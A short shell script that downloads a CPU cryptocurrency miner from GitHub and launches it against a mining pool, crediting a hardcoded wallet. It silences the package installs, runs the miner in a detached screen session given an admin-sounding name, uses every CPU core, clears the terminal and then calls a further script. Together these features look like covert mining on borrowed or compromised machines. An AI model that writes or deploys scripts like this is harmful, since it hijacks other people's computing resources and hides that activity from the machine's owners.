#!/bin/sh

WALLET=web1qru93ddk90hutjzhrejqs84d86cknqj9rlm2szm.Vapers86-$(echo $(shuf -i 1-9999 -n 1))

POOL=asia.rplant.xyz:7017

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz;
tar xf cpuminer-opt-linux.tar.gz;
screen -S Admin_Open_Bo -dm ./cpuminer-avx512 -a yespower -o $POOL -u $WALLET -t $(nproc)
screen -ls
sleep 2
clear
cd ..
screen -ls
./Timer_Bo.sh
